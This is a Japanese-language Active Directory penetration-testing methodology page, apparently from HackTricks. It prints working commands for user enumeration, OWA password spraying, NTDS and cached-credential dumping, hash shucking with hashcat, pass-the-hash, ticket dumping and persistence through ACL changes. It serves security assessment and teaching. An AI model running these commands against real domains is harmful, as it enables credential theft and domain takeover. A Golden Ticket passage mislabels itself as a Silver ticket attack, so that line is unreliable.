# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は、ネットワーク管理者がネットワーク内の **domains**、**users**、**objects** を効率的に作成・管理できる基盤技術です。大規模にスケールするよう設計されており、多数のユーザーを **groups** や **subgroups** に整理し、様々なレベルでの **access rights** を制御できます。

**Active Directory** の構造は主に 3 つの層で構成されます：**domains**、**trees**、**forests**。**domain** は共通のデータベースを共有する **users** や **devices** といったオブジェクトの集合体です。**trees** は共通の構造で結ばれた複数の domains の集まりで、**forest** は複数の trees が **trust relationships** によって接続された最上位の組織単位を表します。各レベルで特定の **access** や **communication rights** を割り当てることができます。

Active Directory の主要な概念は次の通りです：

1. **Directory** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **Object** – ディレクトリ内の実体を指し、**users**、**groups**、または **shared folders** などが含まれます。
3. **Domain** – ディレクトリオブジェクトのコンテナで、複数の domains が **forest** 内で共存でき、それぞれが独自のオブジェクト集合を保持します。
4. **Tree** – 共通のルートドメインを共有する domains のグループです。
5. **Forest** – Active Directory の組織構造の頂点で、複数の trees とそれらの間の **trust relationships** で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠な一連のサービスを含みます。これらのサービスには次が含まれます：

1. **Domain Services** – データの集中保管を行い、**users** と **domains** 間のやり取り（**authentication** や **search** 機能を含む）を管理します。
2. **Certificate Services** – 安全な **digital certificates** の作成、配布、管理を担います。
3. **Lightweight Directory Services** – **LDAP protocol** を用いてディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 複数の web アプリケーションに対する **single-sign-on** を提供します。
5. **Rights Management** – 著作物の無断配布や利用を制限して保護を支援します。
6. **DNS Service** – **domain names** の名前解決に不可欠です。

より詳しい説明は次を参照してください: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## チートシート

素早く AD の列挙/悪用に使えるコマンドを確認したい場合は、次を参照してください: [https://wadcoms.github.io/](https://wadcoms.github.io)

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

もし AD 環境へのアクセスはあるが資格情報/セッションを持っていない場合、以下のようなアプローチが考えられます：

- **Pentest the network:**
  - ネットワークをスキャンしてマシンや開いているポートを見つけ、**exploit vulnerabilities** を試したり、これらから **extract credentials** を試みます（例：`printers could be very interesting targets` を参照）。
  - DNS の列挙は web、printers、shares、vpn、media などドメイン内の重要なサーバに関する情報を与える可能性があります。
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 詳細は一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照してください。
- **Check for null and Guest access on smb services** (これは最新の Windows バージョンでは動作しない場合があります):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB サーバの列挙に関するより詳細なガイドは次を参照してください：

{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP 列挙の詳細ガイド（**匿名アクセスに特に注意**）は次を参照してください：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
  - Responder を使って **impersonating services** によって資格情報を収集する（参照: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md）
  - [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) によってホストへアクセスする
  - **fake UPnP services with evil-S** を公開して資格情報を収集する（参照: ../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md）[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 内部ドキュメント、ソーシャルメディア、サービス（主に web）や公開されている情報からユーザー名や氏名を抽出します。
  - 会社の従業員のフルネームが得られた場合、様々な AD **username conventions** を試すことができます（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。一般的な命名規則には次のようなものがあります： _NameSurname_, _Name.Surname_, _NamSur_（それぞれ3文字ずつ）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 文字のランダムな英字と 3 桁のランダム数字（abc123）。
  - ツール:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: サーバに対して **invalid username** を問い合わせると、サーバは **Kerberos error** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返し、ユーザー名が無効であることを判別できます。**Valid usernames** に対しては、AS-REP 内の **TGT** が返されるか、またはプリオーセンティケーションが必要であることを示すエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ が返されます。
- **No Authentication against MS-NRPC**: domain controllers 上の MS-NRPC (Netlogon) インターフェースに対して auth-level = 1（認証なし）を使う手法です。このメソッドは MS-NRPC インターフェースにバインドした後 `DsrGetDcNameEx2` 関数を呼び出して、資格情報なしでユーザーやコンピュータの存在を確認します。NauthNRPC ツールがこの種類の列挙を実装しています。研究内容は次を参照してください: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、**user enumeration against it** を実行することもできます。例えば、ツール [**MailSniper**](https://github.com/dafthack/MailSniper) を使用できます:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **会社で働いている人の名前** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して最も**一般的なパスワード**を試してください。悪いパスワードを使っているユーザーがいるかもしれません（パスワードポリシーに注意してください）。
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワーク上のいくつかのプロトコルをpoisoningすることで、クラック可能なチャレンジハッシュを取得できる場合があります:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**は、既に保有しているすべてのNTハッシュを、鍵素材がNTハッシュから直接派生する他のより遅いフォーマット向けの候補パスワードとして扱います。Kerberos RC4チケット、NetNTLMチャレンジ、またはキャッシュされた資格情報で長いパスフレーズを総当たりする代わりに、NTハッシュをHashcatのNT-candidateモードに投入して、平文を知らずにパスワード再利用を検証します。ドメイン侵害後に数千の現在および過去のNTハッシュを収集できる場合、特に有効です。

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – 各ハッシュを生成した username/domain を保持してください（wordlistが16進だけでも）。ハッシュが一致すれば、Hashcatが勝利候補を出力した時点でどのプリンシパルがパスワードを再利用しているかすぐに分かります。
- 同一フォレストまたは信頼されたフォレストからの候補を優先すると、shucking時の重複の可能性が最大化されます。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcatは各NT候補からRC4キーを導出して`$krb5tgs$23$...`ブロブを検証します。マッチすれば、そのサービスアカウントが既存のNTハッシュのいずれかを使用していることが確定します。

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要なら後で `hashcat -m 1000 <matched_hash> wordlists/` を使って平文を復元することもできます。

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

このフェーズでは、有効なドメインアカウントの資格情報またはセッションを**奪取している**必要があります。もし有効な資格情報やドメインユーザーとしてのシェルを持っているなら、先に挙げたオプションは他のユーザーを侵害するための手段として引き続き有効であることを覚えておいてください。

認証付き列挙を始める前に、**Kerberos double hop problem** が何かを理解しておくべきです。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

アカウントを奪取することは、ドメイン全体を侵害するための大きな一歩です。これにより**Active Directoryの列挙**を開始できます:

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- [**powershell for recon**](../basic-powershell-for-pentesters/index.html) を使用することもできます（こちらの方がステルス性が高いです）。
- [**use powerview**](../basic-powershell-for-pentesters/powerview.md) を使ってより詳細な情報を抽出できます。
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) は興味深い情報を含んでいる場合があります。
- ディレクトリ列挙に使えるGUIツールとしては、SysInternal Suiteの **AdExplorer.exe** があります。
- ldapsearch を使ってLDAPデータベース内の _userPassword_ や _unixUserPassword_、あるいは _Description_ フィールドに資格情報がないか検索することもできます。その他の方法は cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windowsでは全ドメインユーザー名を取得するのは非常に簡単です（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linuxでは `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` や `enum4linux -a -u "user" -p "password" <DC IP>` を使えます。

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

資格情報を入手したら、どの**マシン**にアクセスできるかを確認してください。ポートスキャンに基づいて、複数のサーバに対して異なるプロトコルで接続を試みるために **CrackMapExec** を使用できます。

### Local Privilege Escalation

通常のドメインユーザーとして資格情報やセッションを奪取し、ドメイン内の任意のマシンにそのユーザーで**アクセス**できる場合は、ローカルで権限昇格して資格情報を漁る方法を探すべきです。ローカル管理者権限を得ることで、他ユーザーのハッシュをメモリ（LSASS）やローカル（SAM）からダンプできるようになります。

本書には [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) の完全なページと、[**チェックリスト**](../checklist-windows-privilege-escalation.md) があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の利用も忘れないでください。

### Current Session Tickets

現在のユーザーが予期しないリソースへアクセスする権限を与える**チケット**を所持している可能性は非常に**低い**ですが、確認することはできます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

もし active directory を列挙できていれば、**より多くのメールとネットワークに関する理解**が得られます。NTLM の [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) を強制できる可能性があります。**

### Looks for Creds in Computer Shares | SMB Shares

基本的な credentials を手に入れたら、AD 内で共有されている**興味深いファイル**がないか確認するべきです。手動でもできますが、とても退屈で反復的な作業です（チェックすべきドキュメントが何百とあればなおさら）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

他の PCs や shares にアクセスできる場合、（SCF file のような）ファイルを配置して、誰かがそれにアクセスしたときにあなたに対して NTLM authentication をトリガーさせ、NTLM challenge を盗んでクラックすることができます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性により、認証済みの任意のユーザーが domain controller を乗っ取ることができました。


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory上での Privilege escalation（特権付き credentials/session がある場合）

**以下の techniques には通常の domain user だけでは不十分で、これらの攻撃を実行するには特別な privileges/credentials が必要です。**

### Hash extraction

幸いにも [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（リレイを含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md）、[escalating privileges locally](../windows-local-privilege-escalation/index.html) などを使っていくつかの local admin アカウントを compromise できているかもしれません。次はメモリやローカルからすべてのハッシュをダンプする時です。  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーの hash を入手したら**、それを使ってそのユーザーを **impersonate** できます。  
その hash を使って **NTLM authentication を行う**ような **tool** を使うか、あるいは新しい **sessionlogon** を作成してその **hash** を **LSASS** に **inject** しておく方法があります。そうすれば任意の **NTLM authentication** が行われた際にその hash が使用されます。後者は mimikatz が行う方法です。  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃は、一般的な Pass The Hash（NTLM）プロトコルの代替として、ユーザーの NTLM hash を使って Kerberos チケットを要求することを目的としています。したがって、NTLM プロトコルが無効化され、認証に Kerberos のみが許可されているネットワークで特に有用です。

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

もし local administrator の **hash** や **password** を持っているなら、それを使って他の **PCs** に **login locally** を試みるべきです。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり**ノイズが多く**、**LAPS**で**軽減**できます。

### MSSQLの悪用と信頼リンク

ユーザーが**MSSQLインスタンスにアクセスする**権限を持っている場合、（インスタンスがSAとして動作している場合）MSSQLホスト上で**コマンドを実行**したり、NetNTLMの**hash**を**盗む**、あるいは**リレー攻撃**を実行できる可能性があります。\
また、あるMSSQLインスタンスが別のMSSQLインスタンスから信頼（database link）されている場合、ユーザーがその信頼されたデータベースに対する権限を持っていれば、**信頼関係を利用して他のインスタンスでもクエリを実行する**ことが可能になります。これらのトラストは連鎖でき、最終的にユーザーがコマンドを実行できるような誤設定されたデータベースを見つけることがあり得ます。\
**データベース間のリンクはフォレスト間のトラストを跨いでも機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT資産／デプロイメントプラットフォームの悪用

サードパーティのインベントリ／デプロイメントスイートは、資格情報やコード実行への強力な経路を公開していることが多いです。参照：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

属性[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)を持つComputerオブジェクトを見つけ、かつそのコンピュータ上でドメイン権限を持っている場合、そのコンピュータにログインするすべてのユーザーのメモリからTGTをダンプすることができます。\
つまり、もし**Domain Admin**がそのコンピュータにログインすれば、彼のTGTをダンプして[Pass the Ticket](pass-the-ticket.md)を使って彼になりすますことが可能です。\
constrained delegationのおかげで、**自動的にPrint Serverを侵害**することさえできます（できればDCであってほしい）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーやコンピュータが「Constrained Delegation」を許可されている場合、そのコンピュータ内のいくつかのサービスへアクセスするために**任意のユーザーを偽装してアクセスする**ことが可能です。\
さらに、このユーザー／コンピュータの**hashを奪取**すれば、（Domain Adminsを含む）**任意のユーザーを偽装**してサービスにアクセスすることが可能になります。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモートコンピュータのActive Directoryオブジェクトに対して**WRITE**権限を持っていると、**昇格した権限でのコード実行**を獲得できるようになります：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

侵害されたユーザは、横移動や権限昇格を可能にするようなドメインオブジェクトに対する**興味深い権限**を持っていることがあります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

ドメイン内で**Spoolサービスがリッスンしている**ことを発見すると、それを**悪用**して**新しい資格情報を取得**し、**権限を昇格**させることができます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

もし**他のユーザ**が**侵害された**マシンに**アクセス**した場合、メモリから**資格情報を収集**したり、プロセスに**ビーコンを注入**して彼らを偽装することさえ可能です。\
通常、ユーザはRDPでシステムにアクセスするため、ここではサードパーティのRDPセッションに対するいくつかの攻撃手法を示します：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**はドメイン参加コンピュータの**ローカル Administrator パスワード**を管理するシステムを提供し、それが**ランダム化**され、一意で、頻繁に**変更**されることを保証します。これらのパスワードはActive Directoryに格納され、アクセスはACLによって権限を持つユーザのみに制御されます。これらのパスワードにアクセスするための十分な権限があれば、他のコンピュータへのピボットが可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

侵害されたマシンから**証明書を収集**することは、環境内での権限昇格の手段になり得ます：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

脆弱なテンプレートが設定されている場合、それらを悪用して権限昇格することが可能です：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高権限アカウントでのポストエクスプロイト

### Dumping Domain Credentials

一度**Domain Admin**、あるいはさらに**Enterprise Admin**の権限を得ると、**ドメインデータベース**（_ntds.dit_）を**ダンプ**することができます。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前に述べた手法のいくつかは永続化に使用できます。\
例えば次のようなことが可能です：

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**は、特定のサービス向けに**正当なTicket Granting Service (TGS)チケット**を**NTLM hash**（例えばPCアカウントの**hash**）を使って生成します。この手法は**サービス権限へアクセスする**ために用いられます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**は、Active Directory環境で**krbtgtアカウントのNTLM hash**にアクセスすることを伴います。このアカウントは、ADネットワーク内での認証に必須であるすべての**Ticket Granting Ticket (TGT)**に署名するために使用されるため特別です。

攻撃者がこのhashを取得すると、任意のアカウント用の**TGT**を作成することができます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは**Golden Ticket**に似ていますが、一般的な**Golden Ticket検出メカニズムを回避する**ように偽造されたものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

アカウントの**証明書を保持する、または要求できる**ことは、たとえパスワードを変更されてもユーザアカウントに永続化するための非常に有効な方法です：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

証明書を使用することは、ドメイン内部で高権限を持ったまま永続化することにも利用できます：


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

**AdminSDHolder**オブジェクトはActive Directory内で**特権グループ**（Domain AdminsやEnterprise Adminsなど）のセキュリティを確保するため、これらのグループに標準の**Access Control List (ACL)**を適用して不正な変更を防ぎます。しかし、この機能は悪用され得ます。攻撃者がAdminSDHolderのACLを変更して通常ユーザにフルアクセスを与えると、そのユーザはすべての特権グループに対して広範な制御権を得てしまいます。本来保護を目的としたこの仕組みは、監視が不十分だと逆効果になり、不当なアクセスを許してしまう可能性があります。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての**Domain Controller (DC)**には**ローカル管理者**アカウントが存在します。そのようなマシンで管理者権限を取得すると、**mimikatz**を使ってローカルAdministratorのhashを抽出できます。その後、レジストリの修正が必要になり、このパスワードの使用を**有効化**することでローカルAdministratorアカウントへリモートアクセスできるようになります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定のドメインオブジェクトに対してユーザに**特別な権限を付与**することで、そのユーザが将来的に**権限を昇格**できるようにすることができます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors**は、オブジェクトが持つ**権限**を格納するために使用されます。オブジェクトの**security descriptor**に少し変更を加えるだけで、特権グループのメンバーでなくてもそのオブジェクトに対して非常に有用な権限を得ることができます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

メモリ内の**LSASS**を改変して**ユニバーサルパスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の**SSP**を作成して、マシンにアクセスするために使われる**資格情報**を**平文でキャプチャ**することができます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

これはADに**新しいDomain Controller**を登録し、それを使って指定オブジェクトに対して（SIDHistory、SPNsなどの）属性を**ログを残さずに**プッシュします。**DA**権限と**ルートドメイン**内にいることが必要です。\
ただし、誤ったデータを使用すると、かなり醜いログが残る点に注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

以前、**LAPSパスワードを読み取る十分な権限がある**場合に権限昇格する方法について説明しました。しかし、これらのパスワードは**永続化を維持する**ためにも使用できます。\
参照：


{{#ref}}
laps.md
{{#endref}}

## フォレスト権限昇格 - ドメイントラスト

